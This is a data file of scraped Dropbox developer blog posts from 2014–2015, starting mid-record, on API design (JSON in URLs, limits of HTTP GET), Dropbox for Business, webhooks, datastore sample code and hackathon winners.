/emails?from[name]=Don&from[date]=1998-03-24&to[name]=Norm These are all reasonable workarounds, but they're still workarounds. There's no widespread standard. JSON handles nesting in a consistent and straightforward manner. Is URL encoding just bad? Nope. It's just designed for a different situation: human interactive use. JSON makes you quote every string. That makes things simpler and more robust, but also makes things a more tedious for a human to read and write. URL parameters are much quicker to whip up, and for the common case, that's fine. The downside is that there's a higher risk of messing something up. And any code that deals with URL parameters ends up more complicated because of it. These are reasonable tradeoffs. I wouldn't want to use JSON in my browser address bar. But an HTTP-based API might be better served by something closer to JSON's spot on the spectrum. So what's the problem? When you think about it, we've already all sort of decided that JSON is better than URL encoding for some things. HTTP API responses for structured data are almost always JSON. The last time I dealt with a URL encoded response body was for OAuth 1, which was finalized in 2007. OAuth 2 switched to JSON. API request bodies seem split between JSON and URL encoding. One nice thing about URL encoding is that you can have nice \"curl\" command-line examples . But many APIs, including Dropbox's newer APIs, have been moving toward using JSON in the request body. So why not use JSON in the URL as well? Well, there's this: URL encoded: /log?a=b&c=4 JSON in URL: /log? %7B%22 a %22 : %22 b %22 , %22 c %22 :4 %7D For one, it's much longer. This can become a problem if it starts pushing you past the practical URL length limit . It also looks ugly, but that can be solved by taking abstraction seriously. For example, you don't ever deal with raw network packets unless something goes wrong at the packet level. Similarly, you shouldn't have to deal with the ugly version of the URL unless you have an invalid URL. Once it's past that check, you should only see the decoded string in any error messages or logging output. Creating a clean abstraction takes extra work, especially if you've been used to getting away without it. Using JSON in your URLs will have a bunch of up-front annoyances to resolve, but the overall benefits might make it worth trying. // Tags Developers Deep Dives Http Tips and Tricks // Copy link Link copied Link copied", "date": "2015-03-25"},
{"website": "Dropbox", "title": "Droplock, a Dropbox hack, wins BattleHack LA!", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/droplock-a-dropbox-hack-wins-battlehack-la", "abstract": "Winning it all About Droplock About the Droplock team I spent the weekend at BattleHack LA , a hackathon put on by Braintree , and I had a great time working with a number of teams who integrated Dropbox into their projects. From car alarms to auctions to a tool that helps blind people run, I saw a lot of interesting Dropbox integrations. The team I ultimately chose to win the Dropbox category was Droplock : a tool that helps you when someone steals your laptop. [tweet https://twitter.com/braintree_dev/status/572189802319228928 align=\"center\" hide_thread=\"true\"] The Droplock team is depicted above. From left to right: Israel Torres, Brandon Whitney, and Ethan Wessel. (And that's me on the right.) As winners of the Dropbox category, everyone on the team won a Mini Jambox and 25GB of free Dropbox space. Brandon got a little too excited about his win and tweeted his free space code. :-) Amazingly, no one typed in the code and claimed his space before he got a chance! [tweet https://twitter.com/BxRadTweets/status/572191149173186560 align=\"center\" hide_thread=\"true\"] Winning it all In addition to their win in the Dropbox category, the team went on to win the entire event! That means Droplock will represent LA in the BattleHack world finals in November, with a chance to win $100,000 USD. [tweet https://twitter.com/braintree_dev/status/572192673848672256 align=\"center\" hide_thread=\"true\"] About Droplock Droplock is a tool to help you when your laptop is stolen. The system consists of an agent that runs on the laptop and a website for the laptop owner. A user can report their laptop as stolen on the website, which tells the agent on the laptop to wake up and start tracking the stolen laptop. This is where the Dropbox integration starts. When a laptop is reported as stolen, it starts storing files into Dropbox. It stores the laptop's network information (external IP address, wireless network, etc.), and it takes pictures with the laptop's built-in camera. Because everything is just stored in the local Dropbox folder, this works even if the laptop is offline. The next time the laptop is connected to the internet, the data will get sent to Dropbox. The website gives the laptop's owner a way to view the information from Dropbox (using the Core API ), helping the owner to track down the location of the laptop and the thief who stole it! In addition to tracking down the stolen laptop, Droplock had an interesting idea for allowing laptop thieves to redeem themselves. The thief is prompted with an option to donate to charity (through JustGiving , another BattleHack sponsor) or pay the laptop owner directly via Braintree . If they fail to take one of these options, the laptop gets locked down until payment is made. As you can imagine, there isn't time in a single hackathon to polish every aspect of the project. The team tells me they have plans to add some more functionality and make the project cross-platform. (Today it only works on OS X.) If you want to follow the team's progress, check out their GitHub repo: https://github.com/3wit/Droplock-BattleHack . About the Droplock team The Droplock team consisted of Israel Torres ( @theleovander ), Ethan Wessel, and Brandon T. Whitney ( @BxRadTweets ). Ethan and Israel met as web development interns at Orange Coast College in 2011, and they've worked on a few iOS and Android apps together. Israel later met Brandon at California State University, Long Beach , where they took a database course together and collaborated on a few team projects. Thank you to the BattleHack team at Braintree for including Dropbox in their event, and a big thanks to the Droplock team for building a great hack! // Tags Developers Hackathon Developer Spotlight // Copy link Link copied Link copied", "date": "2015-03-04"},
{"website": "Dropbox", "title": "New! Groups in the Dropbox for Business API", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/new-groups-in-the-dropbox-for-business-api", "abstract": "Today we're happy to announce our new Groups feature for Dropbox for Business, and new API endpoints for Groups. With the new Groups feature, Dropbox for Business team admins can create and manage lists of team members and give them access to specific folders. With the new Groups API endpoints, you can build tools to better manage teams and group membership and can integrate with existing IT user management systems, such as Active Directory or LDAP. We've added Dropbox for Business API endpoints for listing existing groups, creating and deleting groups, adding and removing group members, and updating group member access permissions. We've been testing a beta version of the Groups API with several SSO and DLP providers who are building integrations on top of the Groups API and we hope to see many more integrations in the future! You can check out the Dropbox for Business API documentation for more details and let us know if you have any questions in our developer forum . Learn more about Dropbox for Business at our upcoming Dropbox for Business API tech talk on Wednesday, March 25 in San Francisco. RSVP today! // Tags Developers Announcements Business // Copy link Link copied Link copied", "date": "2015-03-05"},
{"website": "Dropbox", "title": "Fix dress colors with Dropbox", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/fix-dress-colors-with-dropbox", "abstract": "For some reason , white and gold things appear blue and black to a large number of people. As a demo for BattleHack LA , I built an app that automatically corrects the colors in your images in Dropbox so you can see their true white and gold nature. The full code is on GitHub at github.com/dropbox/whitegold . The app uses webhooks and the Core API ( /delta , /thumbnails , and /files_put ). It's based heavily on the Markdown webhooks sample , so check that out too if you're already sick of #teamwhitegold. // Tags Developers Sample Apps // Copy link Link copied Link copied", "date": "2015-02-28"},
{"website": "Dropbox", "title": "Limitations of the GET method in HTTP", "author": ["Api Developer"], "link": "https://dropbox.tech/developers/limitations-of-the-get-method-in-http", "abstract": "We spend a lot of time thinking about web API design, and we learn a lot from other APIs and discussion with their authors. In the hopes that it helps others, we want to share some thoughts of our own. In this post, we'll discuss the limitations of the HTTP GET method and what we decided to do about it in our own API. As a rule, HTTP GET requests should not modify server state. This rule is useful because it lets intermediaries infer something about the request just by looking at the HTTP method. For example, a browser doesn't know exactly what a particular HTML form does, but if the form is submitted via HTTP GET, the browser knows it's safe to automatically retry the submission if there's a network error. For forms that use HTTP POST, it may not be safe to retry so the browser asks the user for confirmation first. HTTP-based APIs take advantage of this by using GET for API calls that don't modify server state. So if an app makes an API call using GET and the network request fails, the app's HTTP client library might decide to retry the request. The library doesn't need to understand the specifics of the API call. The Dropbox API tries to use GET for calls that don't modify server state, but unfortunately this isn't always possible. GET requests don't have a request body, so all parameters must appear in the URL or in a header. While the HTTP standard doesn't define a limit for how long URLs or headers can be, most HTTP clients and servers have a practical limit somewhere between 2 kB and 8 kB . This is rarely a problem, but we ran up against this constraint when creating the /delta API call. Though it doesn't modify server state, its parameters are sometimes too long to fit in the URL or an HTTP header. The problem is that, in HTTP, the property of modifying server state is coupled with the property of having a request body. We could have somehow contorted /delta to mesh better with the HTTP worldview, but there are other things to consider when designing an API, like performance, simplicity, and developer ergonomics. In the end, we decided the benefits of making /delta more HTTP-like weren't worth the costs and just switched it to HTTP POST. HTTP was developed for a specific hierarchical document storage and retrieval use case, so it's no surprise that it doesn't fit every API perfectly. Maybe we shouldn't let HTTP's restrictions influence our API design too much. For example, independent of HTTP, we can have each API function define whether it modifies server state. Then, our server can accept GET requests for API functions that don't modify server state and don't have large parameters, but still accept POST requests to handle the general case. This way, we're opportunistically taking advantage of HTTP without tying ourselves to it. // Tags Developers Deep Dives // Copy link Link copied Link copied", "date": "2015-03-02"},
{"website": "Dropbox", "title": "Dropbox at BattleHack Los Angeles", "author": ["Smarxdropbox"], "link": "https://dropbox.tech/developers/dropbox-at-battlehack-los-angeles", "abstract": "I'm excited to take part in BattleHack Los Angeles this weekend, a hackathon hosted by Braintree_Dev . The hackathon will be held at Cross Campus Santa Monica this weekend, February 28th and March 1st. This is Dropbox's first time sponsoring, but we've heard a lot of great things about the event. If you're going to be in the area this weekend, get your ticket now . Below is a little teaser trailer to get you excited. I hope to see you there! // Tags Developers Hackathon Developer Community // Copy link Link copied Link copied", "date": "2015-02-23"},
{"website": "Dropbox", "title": "Dropbox for Business API tech talk", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/dropbox-for-business-api-tech-talk", "abstract": "Come meet up with us in San Francisco to learn more about our new Dropbox for Business API . Our own Steve Marx will be giving a talk and there will be time to network and chat with members of our Dropbox API community. RSVP here! Here are the details: Dropbox for Business API tech talk Wednesday, March 25th 7 to 9 PM (doors open at 6:30 PM) Wix Developer's Lounge - 500 Terry A Francois Boulevard, San Francisco, CA There will be light food and beverages at the event. About Steve's talk: Dropbox has a new API specifically for developers to access and manipulate data for the 100,000 businesses and teams using Dropbox for Business. From dashboards to management tools to data loss prevention solutions, the Dropbox for Business API opens up a wide variety of opportunities for third-party developers as well as in-house IT. Steve Marx will introduce the new API, explain why Dropbox built it, and show you demos of how you can use it in your app. About our sponsor, Wix: Thanks to our sponsor, Wix , for hosting us at their Wix Developer's Lounge. Wix.com gives developers the ability to reach an audience of 55 million users. With Wix.com's Media Platform you can easily store, edit and transcode your images, videos, and audio in the cloud. Wix also provides a simple and easy-to-use JavaScript SDK to integrate third-party Apps into the Wix platform. You can develop on the stack you prefer with any technology you like. Hope to see you there! // Tags Developers Developer Community Meetup Announcements // Copy link Link copied Link copied", "date": "2015-02-19"},
{"website": "Dropbox", "title": "Marvel uses Dropbox webhooks for real-time syncing", "author": ["Brendan Moore"], "link": "https://dropbox.tech/developers/marvel-uses-dropbox-webhooks-for-real-time-syncing", "abstract": "Polling for changes Webhooks and Pusher The benefit Brendan Moore is the Co-Founder and CTO at Marvel , the simplest way to create cross-platform prototypes and bring digital app and web ideas to life. Founded in 2011 and based in London, Marvel is used by over 60,000 designers, product managers, teachers, and students. One of the really powerful features in Marvel is the ability to provide real-time updates from our users' Dropbox accounts. Within the last month we upgraded from our well-serving, but now outdated, polling mechanism to real-time updates via Dropbox's new webhooks feature. Polling for changes Upon exploring the Dropbox Core API it became apparent that there was some pretty powerful features we were ignoring, including the delta feature. You can call delta with a string known as a cursor , essentially a state variable indicating where your system is in comparison to the user’s Dropbox. Dropbox then replies with a list of changes that have occurred since you were issued your cursor (e.g. files that have been altered, added or removed). Dropbox issues you a new cursor as well as a has_more indicator telling you if there are more changes to be synced. In essence this mechanism allows us to watch for file updates and changes for any content we have linked to a user’s Marvel account. Excitedly Murat and I discussed how we could work this feature into Marvel and provide real-time syncing of files. Our goal was for a designer to be able to change a PSD in photoshop and a few moments later this change would reflect on their device. For the first 8 months of Marvel we used the following polling technique to achieve this: The user would load up their Marvel prototype on their device via an initial page load followed by an ajax call to retrieve project information. We’d send a saved copy of a cursor we received from Dropbox as the starting point of a user’s session. We then polled every 6 seconds to ask Dropbox for any changes within the user’s Dropbox. Each time we called Dropbox, it would respond with a potential list of file changes for the user. Any file changes not relating to the project we ignored. For any content related to the project we would pull and sync it to the Marvel project. The end result would be a new image synced to the user's prototype directly from Photoshop or their chosen design tool, such as Sketch. Finally, we’d save the most recent cursor, reissue it to the prototype, and reiterate the polling mechanism for as long as the user's session was opened. The system served us well for months and we were reliably able to sync content within 20 seconds of saving a PSD file to a user's desktop. However, there were a number of drawbacks with this approach Every time a project or prototype polled for changes we were opening a connection to our server and then to Dropbox, in a full synchronous request. This meant we were holding open connections for between 2-3 seconds. Given the frequency of the requests from prototypes this could at times potentially hold open way too many of our connections and prevent the website from operating normally. The sync was based on a poll-only mechanism which meant that we would only ever check for changes when the user came online or someone viewed their prototype. Any changes related to a file wouldn’t update as quickly as desired, so precious seconds would be lost in between a potential update from Dropbox. In addition, our polling system sometimes polled multiple files in a prototype at a time, which proved to be inefficient. Webhooks and Pusher Webhooks are an efficient way for web platforms to notify each other of changes in real-time. Dropbox announced webhook support in May, immediately revolutionizing the way apps integrate with their service. Dropbox webhooks remove the need for Marvel to do expensive and inefficient polling for file changes. Instead, when a user alters a file in Dropbox our system gets notified that a change has occurred. The call simply contains the user's Dropbox ID and our service queues up a check for file changes related to that user. Similar to step 2 in our polling solution, we can then utilise a cursor to verify any file changes and update that file within our system. In order to notify any prototypes or projects of this change we use Pusher , a London-based company that provides a fast and reliable broadcast method for messages to websites, apps, or any service you require. Pusher uses WebSockets to open a permanent connection to a Marvel prototype channel. Within seconds of receiving an update about a file change we can notify any relevant clients of that change. Our aim is to continually improve the speed of this integration and to make the prototyping experience as real-time as possible. The benefit Dropbox's webhook and delta service has been invaluable for powering our service. Our users work in fast-paced client-driven environments where deliverables are always on tight timelines. An ability to leverage real-time syncing saves time and money when delivering ideas to a client. In it's simplest form, it's an empowering tool for designers to be able to validate their ideas without touching a single line of code. It's a testament to the community of sharing and openness that's helped our startup to become a funded and fast growing business, powered by the Dropbox API. // Tags Developers Developer Spotlight Webhooks Automation // Copy link Link copied Link copied", "date": "2014-12-09"},
{"website": "Dropbox", "title": "Announcing the Dropbox for Business API", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/announcing-the-dropbox-for-business-api", "abstract": "Today we're excited to launch the new Dropbox for Business API . Dropbox for Business provides additional storage and security features specifically for companies, and now these features are available via the API! If you're new to Dropbox for Business, you can find out more here . New API endpoints First, we've added lots of new API endpoints , specifically for businesses. Your app can now get info about your Dropbox for Business team and team members . Your app can also manage team members with endpoints to add , remove , and update your Dropbox for Business team. Want to know more about your team's activity? Check out the new reports and audit log API endpoints. Member file access In addition to new API endpoints, apps with Team member file access permission can make Core API calls on behalf of any member of a Dropbox for Business team. This allows your app to provide admins with additional security and monitoring features. Webhooks Two new types of webhook notifications are available for Dropbox for Business apps. First, your app can receive per-user notifications of updates for all members of a Dropbox for Business team, similar to the existing webhook notifications. Second, your app can receive notifications of changes to team membership such as when a user is invited to a team, a member's profile or permissions are updated, or a member is removed from a team. Find out more about Dropbox for Business webhooks . Creating a Dropbox for Business app To use the new Dropbox for Business API , you'll need to create a new app in the Dropbox App Console . You'll see that there are new permissions that allow access to certain Dropbox for Business API features. Try out the new Dropbox for Business API and let us know what you think. We're excited to see what you build! // Tags Developers Announcements Business Endpoints Teams // Copy link Link copied Link copied", "date": "2014-12-03"},
{"website": "Dropbox", "title": "Heroku announces Dropbox Sync", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/heroku-announces-dropbox-sync", "abstract": "How it works You can do this too Today, Heroku announced the ability to deploy apps directly from Dropbox! They're calling this feature Dropbox Sync, and it's available in beta right now. You can read the full details about the feature on the Heroku blog . How it works Heroku uses the /delta endpoint to determine what files have changed in Dropbox. Developers may then click a \"Deploy\" button in the Heroku dashboard to kick off a deployment. Changes made by one user can be synced with a collaborator's Dropbox. Similarly, changes made via git (Heroku's other deployment protocol) are pushed to Dropbox and vice versa. This syncing back and forth could potentially lead to conflicts so Heroku is using Dropbox's built-in mechanism for flagging \" conflicted copy \" files, and then asking users to resolve such conflicts before deploying from Dropbox again. See the Dropbox Sync article in Heroku's Dev Center for more details on collaboration and conflict resolution. You can do this too Heroku built this feature themselves using the existing functionality in the Core API . We've seen quite a few companies build similar integrations with Dropbox to deploy code, content, or other assets. This kind of content syncing and deployment is a growing use case for the Dropbox API, so we're always working hard to make it even easier to build. For example, we recently added webhooks so each file save can trigger an event such as a code deploy. Give it a try in your own product, and let us know if you run into trouble! // Tags Developers Announcements Api V1 Partners Deprecated // Copy link Link copied Link copied", "date": "2014-11-19"},
{"website": "Dropbox", "title": "London Dropbox Hackathon photos and winners", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/london-dropbox-hackathon-photos-and-winners", "abstract": "Overall Winner: Matter Dropbox Star: Easy Wallet London Local: Dropbox Pictour Cool Tech: Dropbox Live This past weekend we hosted our first London Dropbox Hackathon . Over 120 hackers showed up to build apps using the Dropbox APIs. We began the event with a welcome from Mark Van Der Linden, our new UK & Benelux Country Manager. Ilya Fushman, Head of Product, talked about the spirit of hacking at Dropbox, including our own Hack Week tradition. Jon Mountjoy from Heroku talked about doing more with less and the future of collaboration in the cloud with Heroku. We wrapped up the presentations with Steve Marx, PM for Developer Platform, who introduced the Dropbox APIs and, to get participants' creative ideas flowing, showed a demo of an American English to British English translator built using the Dropbox Core API and webhooks . Congratulations to the winners of the London Dropbox Hackathon! After the presentations, the hacking began... and went all night long. Amazing hacks emerged after twelve hours of brainstorming, coding, and lots of soda and snacks. Some of them were educational (Bookbox used machine learning to deliver e-books straight to your Dropbox), some of them were futuristic (3D-Dropbox let you upload physical objects to your digital Dropbox with the help of a 3-D scanner), some of them were pure fun (SelfieSomething let you snap a selfie, save it to your Dropbox, edit it with some quick drawing tools, then send it off to a friend). Overall Winner: Matter Matter is a private blogging tool used to store and sync memories in Dropbox. The team demonstrated how users of this mobile app can save photos and text to Dropbox, organized in a neat timeline. Because all the data is stored in files in Dropbox, everything is accessible and editable from anywhere, even without using the app. Members: Alex Curran, and Stuart Lynch Prize: £1000 cash . [tweet https://twitter.com/amlcurran/status/559422752374128641 align=\"center\"] Dropbox Star: Easy Wallet The Dropbox Star prize was awarded to the team that made the best use of the Dropbox API in their hack. Easy Wallet won the award by turning Dropbox into a bitcoin wallet. The entire interface to Easy Wallet is the file system in Dropbox. For example, users can make change from their bitcoins by simply renaming files in Dropbox, and can give away bitcoin by sending a file. Member: Tomas Virgl Prize: £75 Amazon gift card and 25 GB free Dropbox space London Local: Dropbox Pictour The London Local prize was awarded to the hack with the best emphasis on London. Dropbox Pictour won this award with their app that helps users take directed tours around London. Pictour starts by giving a user a hint as to where to start their tour. The user needs to make their way to that location and take a picture there. Pictour notices the new picture in Dropbox, checks the geolocation of the photo, and rewards the user with a hint for their next location. Members: Murat Mutlu, Sean Preston, Joe Alcora, and Brendan Moore Prize: £75 Amazon gift card and 25 GB free Dropbox space each. Cool Tech: Dropbox Live The Cool Tech prize was awarded to the team that built the most impressive technical hack. The Dropbox Live team won the prize with their hack to perform instant camera uploads with their DSLR camera. By building their own SD card mirroring and Dropbox uploading via an attached Raspberry Pi, this team managed to make camera uploads almost instantaneous from their camera. You can see some of the images they captured live at the hackathon via their Twitter account: @dropboxlive2 . Members: Murat Mutlu, Sean Preston, Joe Alcora, and Brendan Moore Prize: £75 Amazon gift card and 25 GB free Dropbox space each Members: Manoj Nathwaui, Siddharth Vadgama, Usman Mohammad, and Uros Zupan Prize: £75 Amazon gift card and 25 GB free Dropbox space each london-hackathon You can see more hacks, photos, and buzz about the Hackathon on Twitter via the #dbxhackathon hashtag . Thanks to everyone who joined us for London Dropbox Hackathon! // Tags Developers Hackathon Developer Spotlight // Copy link Link copied Link copied", "date": "2015-01-30"},
{"website": "Dropbox", "title": "Lists app in Swift and Swift Hack Day", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/lists-app-in-swift-and-swift-hack-day", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. A couple weekends ago, Dropbox participated in Swift Hack Day in San Francisco. I got a chance to play around with the new Swift programming language for iOS and OS X and even created my own hack, a Swift version of our Lists sample app . You can find the code for Swift Lists on GitHub . I'm still new to Swift so check it out and let us know what you think on our developer forum ! // Tags Developers Hackathon Swift Sample app // Copy link Link copied Link copied", "date": "2014-10-08"},
{"website": "Dropbox", "title": "New! Lists sample app", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/new-lists-sample-app", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. We've created a sample app to show off both shared datastores and local datastores, two of the newest features in the Datastore API . Lists is an iOS , Android , and JavaScript web app that lets you create lists of items and share them with others. For example, you could create a shopping list, a project to-do list, or a list of your favorite pizza joints in San Francisco. Each list is a datastore, and you can make multiple lists. Each list can be shared publicly (or just with your Dropbox for Business team) via a link. When another user opens the link, the shared list will automatically open in their web browser or in one of the mobile apps if they have one installed. Try out the Lists sample app! Source code on GitHub: JavaScript iOS Android // Tags Developers Ios Api V1 Sample app Sample Apps Deprecated // Copy link Link copied Link copied", "date": "2014-09-17"},
{"website": "Dropbox", "title": "Dropbox webhooks for datastores", "author": ["Joy Zheng"], "link": "https://dropbox.tech/developers/dropbox-webhooks-for-datastores", "abstract": "Joy Zheng was a summer 2014 intern at Dropbox on the Developer Platform team. Update: The Sync and Datastore SDK has been deprecated. Learn more here. Once upon a time, server-side applications had to use polling for each of their users to get notifications about file updates. Then, a few months ago, we announced webhooks , which enabled real-time notifications whenever a user's files changed. Now, we're excited to announce the addition of webhooks for datastores , enabling the same kind of real-time notifications for datastore updates. How does it work? For the most part, datastore webhooks behave similarly to file webhooks; you’ll receive a notification at your specified URI every time a user create, updates, or deletes a datastore. The notification will let you know which datastore(s) to fetch in order to process the update. The request body will look something like: Copy {\r\n    \"datastore_delta\": [\r\n        {\r\n            \"handle\": \"abc123\",\r\n            \"dsid\": \"default\",\r\n            \"change_type\": \"update\",\r\n            \"owner\": 12345678,\r\n            \"updater\": 23456789\r\n        },\r\n        {\r\n            \"handle\": \"456xyz\",\r\n            ...\r\n        },\r\n        ...\r\n    ]\r\n} How do I get started? Any existing webhook URIs that you have registered will soon begin receiving datastore webhook notifications. To add a webhook URI, go to the App Console and click on your app. As you scroll down the page, you should see a place to register new webhook URIs: Note that, for security purposes, datastore webhook notifications will only be sent to HTTPS endpoints. For more information, check out the webhooks documentation and tutorial . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-09-17"},
{"website": "Dropbox", "title": "Listary - All your lists", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/listary-all-your-lists", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Listary is a beautiful, fast, and simple iOS app for making lists. Just like our sample Lists app , Listary uses shared datastores for sharing lists, and local datastores so you can use the app without logging into Dropbox first. Here’s what Listary had to say about working with the Datastore API : We decided to build a new Listary from scratch with a goal in mind xe2x80x94 to make it even faster, simpler and, specially, more reliable. As soon as we knew about Dropbox Datastores we had no doubt on going with it to support Listary syncing even not knowing, at that time, if sharing would be supported or not (we believed it would, though). Today, we are very happy about that decision! Datastores just works! Its design is pretty simple and the provided SDKs are just great! Even having to change a significant part of our syncing layer and data architecture in order to support sharing, we did it in a couple of days, and we really love the way sharing datastores was designed. Sharing lists is just a matter of sending links to other users that open Listary to start using them right away. And that's all this magical simplicity that we really love on Datastores. Thanks Dropbox for doing such a nice service! // Tags Developers Announcements Api V1 Deprecated Developer Spotlight // Copy link Link copied Link copied", "date": "2014-09-18"},
{"website": "Dropbox", "title": "Acompli improves mobile email app experience with Dropbox document preview API", "author": ["Admin"], "link": "https://dropbox.tech/developers/acompli-improves-mobile-email-app-experience-with-dropbox-document-preview-api", "abstract": "We've been testing a new document preview API with developers over the past few weeks and are happy to announce that it is ready for everyone! This API endpoint makes it easy to show previews of files from within your app and supports the most popular document formats including PDF, Microsoft Word, PowerPoint, and Excel. Kevin Henrikson is the Cofounder & VP Engineering of Acompli and here are his thoughts on the new document preview API. Acompli combines email, calendar, file sharing, and contacts. We created the ability to view and attach files to email but we wrestled with the ability to show users an accurate preview of those files. Document rendering support on mobile is poor and bandwidth constraints make it impractical for users to download large files. When we extended our unique file-sharing feature to include files from Dropbox, we were excited to learn about the Dropbox document preview API . The preview API was easy to work with and produced beautiful results. Less Work. Works Great. We used two APIs for document previews: /thumbnails – If the file is an image, we use the thumbnails endpoint to generate an extra-large (xl) thumbnail, suitable for rendering in an image view. /previews (NEW) – If the document type is supported by the new document preview API, we use the previews endpoint to generate of preview of the file in PDF or HTML format. For files that don't fall into these two buckets, we download the original file. Why we like the document preview API We've seen dramatic improvements in rendering output when using the document preview API. For example, see the comparison of these two PowerPoint documents: Before Dropbox document previews. After Dropbox document previews. The new previews endpoint drastically cuts down on the extra work needed to produce previews. // Tags Developers Thumbnail Files Partners Developer Spotlight // Copy link Link copied Link copied", "date": "2014-08-15"},
{"website": "Dropbox", "title": "New Datastore features! Shared datastores, local datastores, and datastore webhooks", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/new-datastore-features-shared-datastores-local-datastores-and-datastore-webhooks", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Today we're happy to announce new features in the Datastore API . This is our biggest update since datastores launched last year! The Datastore API includes three new features: shared datastores, local datastores and datastore webhooks. Shared datastores One of the most requested features for the Datastore API is the ability to share data between users. Now your app can share datastores with other Dropbox users by setting permissions and sending the datastore ID, usually by URL. Any Dropbox account with the correct permissions will then be able to access the shared datastore. You can find out more in the Datastore API documentation and tutorial . Local datastores Local datastores, which has been in preview since Datastore SDK 3.0, is now ready for production use. This feature lets your app use datastores without requiring a user to log in with Dropbox first. Data is stored locally until the user logs in with their Dropbox account, at which point everything is migrated to the cloud and synced cross-device. Find out more in the Datastore API documentation . Datastore webhooks In addition to our existing file webhooks, we've now added datastore webhooks . With datastore webhooks your web app will be notified right away when your users' datastores change. Simply register a webhook URI via the App Console and every time a user's datastores change, the webhook URI you specified will be sent a request telling it about the changes. You can find out more in the webhooks documentation . Updated SDKs All of our Sync SDKs and Datastore SDKs have been updated with bug fixes. We've also added support for iOS 8 and Android L to our mobile SDKs. Download a new version today! Read more: New! Lists sample app — A sample mobile and web app with datastore sharing and local datastores. Dropbox webhooks for datastores — Get notified of changes to your users’ datastores. Listary - All your lists — A beautiful iOS app with shared datastores and local datastores. // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-09-17"},
{"website": "Dropbox", "title": "Using the new local datastores feature", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/using-the-new-local-datastores-feature", "abstract": "Sample code Not for production use! Update: The Sync and Datastore SDK has been deprecated. Learn more here. The Datastore API 3.0 release includes a new preview feature called \"local datastores.\" Since we first released the Datastore API, developers have asked us how to deal with users who don't have a Dropbox account. With local datastores, the same code can work regardless of whether the user has logged in with Dropbox. If a user hasn't logged in with Dropbox, all data will just be stored locally. Once a user has logged in with a Dropbox account, data will be stored in the cloud and synced cross-device. The Tasks example app that ships with Datastore API 3.0 shows a typical flow for using local datastores. When someone first starts using the app, the app stores everything in a local datastore. When the user decides they want to back up their data to Dropbox or sync it across devices, they can link a Dropbox account. At this point, the app will migrate the local datastore to that user's account. Sample code The following sample code has been adapted from the code in the Tasks sample that ships with the iOS and Android Datastore SDKs. It shows how to switch from using a local datastore to using a linked Dropbox account: Android version Copy // If the user has linked a Dropbox account for the first time...\r\nif (justLinked) {\r\n    // Perform a one-time migration to move from the local datastore to a remote one.\r\n    mDatastoreManager = mLocalManager.migrateToAccount(mDbxAcctMgr.getLinkedAccount());\r\n    mLocalManager = null;\r\n    mDatastore = mDatastoreManager.openDefaultDatastore();\r\n}\r\nif (null == mDatastoreManager) {\r\n    // If there's a linked account, use that.\r\n    if (mDbxAcctMgr.hasLinkedAccount()) {\r\n        mDatastoreManager = DbxDatastoreManager.forAccount(mDbxAcctMgr.getLinkedAccount());\r\n    }\r\n    // Otherwise, use a local datastore.\r\n    else {\r\n        mDatastoreManager = DbxDatastoreManager.localManager(mDbxAcctMgr);\r\n    }\r\n} iOS version Copy // If the user has linked a Dropbox account for the first time...\r\nif (_justLinked) {\r\n    if (_localDatastoreManager && self.account) {\r\n        // Perform a one-time migration to move from the local datastore to a remote one.\r\n        [_localDatastoreManager migrateToAccount:self.account error:nil];\r\n        _localDatastoreManager = nil;\r\n    }\r\n}\r\nif (!_store) {\r\n    // If there's a linked account, use that.\r\n    if ([[DBAccountManager sharedManager] linkedAccount]) {\r\n        _store = [DBDatastore openDefaultStoreForAccount:self.account error:nil];\r\n    // Otherwise, use a local datastore.\r\n    } else {\r\n        _store = [DBDatastore openDefaultLocalStoreForAccountManager:[DBAccountManager sharedManager]\r\n                                                               error:nil];\r\n    }\r\n} Not for production use! Please give local datastores a try and let us know what you think on the developer forum , but keep in mind that this feature is only in preview. Be sure to read the documentation for known issues and stay tuned for a production-ready release. // Tags Developers Announcements Api V1 Tips Tricks Deprecated // Copy link Link copied Link copied", "date": "2014-06-12"},
{"website": "Dropbox", "title": "Debug your Dropbox app with app error logs", "author": ["Li Chen Koh"], "link": "https://dropbox.tech/developers/debug-your-dropbox-app-with-app-error-logs", "abstract": "EDIT [2015-04-20]: App error logs are disabled for now as we retool the infrastructure behind it. We hope to bring them back in the future! Imagine a world where you can respond to bugs before your users even have a chance to report them. A world where debugging is simple, customers are satisfied, and sleeping soundly at night is possible. Is this world even possible? Yes. The new app error logs enable you to view API errors that your app encounters, allowing you to debug issues as they arise. In many situations, particularly in mobile apps, it's difficult to collect debugging details. With this new feature, it's never been simpler. If you receive a support ticket from a frustrated user, you can search the error logs by their email address. You can also search by HTTP status code. Excited? Awesome! To use this feature, you just need to do the following: Go to the App Console and click on your Awesome App! 2. Click on the Error Logs tab.rn 3. Calmly inspect some error logs. 4. Knowledge is power. To squash some bugs, click on one of the logs for further details! With great power comes great responsibility. Thus, the app error log redacts sensitive user information before displaying it to you. Your users' privacy is never at risk. // Tags Developers Tips Tricks Announcements Errors // Copy link Link copied Link copied", "date": "2014-08-07"},
